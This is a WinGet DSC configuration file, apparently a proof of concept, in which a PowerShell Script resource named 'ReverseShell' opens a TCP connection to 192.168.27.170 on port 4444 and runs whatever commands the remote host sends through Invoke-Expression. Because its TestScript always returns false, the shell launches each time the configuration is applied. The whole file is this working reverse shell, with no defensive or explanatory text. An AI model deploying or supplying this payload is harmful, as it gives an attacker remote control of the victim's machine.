$schema: https://aka.ms/ConfigurationDscSchema
properties:
  configurationVersion: 0.2.0
  resources:
    - resource: PSDscResources/Script
      id: ReverseShell
      directives:
        description: Reverse Shell via WinGet
        allowPrerelease: true
      settings:
        GetScript: |
          @{Result = "OK"}
        TestScript: |
          return $false
        SetScript: |
          $client = New-Object System.Net.Sockets.TcpClient("192.168.27.170",4444)
          $stream = $client.GetStream()
          $reader = New-Object System.IO.StreamReader($stream)
          $writer = New-Object System.IO.StreamWriter($stream)
          $writer.AutoFlush = $true
          $writer.WriteLine("Reverse shell from $env:COMPUTERNAME")
          while ($true) {
              $writer.Write("DSC> ")
              $writer.Flush()
              $cmd = $reader.ReadLine()
              if ($cmd -eq "exit") { break }
              try {
                  $output = Invoke-Expression $cmd 2>&1 | Out-String
                  $writer.WriteLine($output)
              } catch {
                  $writer.WriteLine($_.Exception.Message)
              }
          }
          $writer.Close()
          $client.Close()
